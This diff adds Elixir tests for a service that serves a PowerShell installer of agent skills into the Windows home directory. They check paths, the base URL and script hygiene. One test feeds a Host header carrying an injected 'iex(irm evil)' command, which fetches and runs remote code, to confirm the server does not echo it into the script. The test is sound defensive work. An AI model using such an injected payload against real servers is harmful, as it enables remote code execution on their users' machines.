@@ -121,6 +121,52 @@ defmodule SlipdockWeb.AgentSetupTest do
     end
   end
 
+  # The Windows one: install.sh under WSL puts the skills in the WSL home,
+  # which Claude on Windows never reads (#511).
+  describe "/install.ps1" do
+    @tag :anonymous
+    test "is plain-text PowerShell naming this server, into the Windows home", %{conn: conn} do
+      conn =
+        conn
+        |> Plug.Conn.put_req_header("x-forwarded-proto", "https")
+        |> Map.put(:host, "boards.example.test")
+        |> get("/install.ps1")
+
+      script = response(conn, 200)
+
+      assert response_content_type(conn, :txt) =~ "text/plain"
+      assert script =~ "param([string]$Dir)"
+      assert script =~ "$Base = 'https://boards.example.test'"
+      assert script =~ ~S|"$Base/api/skills.tar.gz"|
+      assert script =~ ~S|Join-Path $HOME '.claude\skills'|
+      assert script =~ "$env:SLIPDOCK_SKILLS_DIR"
+      assert script =~ ~S|Join-Path $HOME '.config\slipdock'|
+      # Piped into iex, it runs in the person's own session: no exit, and no
+      # preference left changed behind it.
+      refute script =~ ~r/^\s*exit\b/m
+      refute script =~ "$ErrorActionPreference"
+    end
+
+    @tag :anonymous
+    test "leaves a url naming another server alone", %{conn: conn} do
+      script = conn |> get("/install.ps1") |> response(200)
+      assert script =~ "elseif ($Current -ne $Base)"
+      assert script =~ "left it alone"
+    end
+
+    @tag :anonymous
+    test "a Host header carrying PowerShell falls back to the configured address", %{conn: conn} do
+      script =
+        conn
+        |> Map.put(:host, "x';iex(irm evil)'")
+        |> get("/install.ps1")
+        |> response(200)
+
+      refute script =~ "evil"
+      assert script =~ "$Base = '#{SlipdockWeb.Endpoint.url()}'"
+    end
+  end
+
   describe "the skills archive" do
     @tag :anonymous
     test "unpacks into an agent directory, without a token", %{conn: conn} do
@@ -153,6 +199,7 @@ defmodule SlipdockWeb.AgentSetupTest do
       assert html =~ "Work from my Slipdock board at #{base}"
       assert html =~ "#{base}/api/guide"
       assert html =~ "curl -fsSL #{base}/install.sh | sh"
+      assert html =~ "irm #{base}/install.ps1 | iex"
     end
 
     test "points at runners, for a board that sends the agent its work", %{conn: conn} do
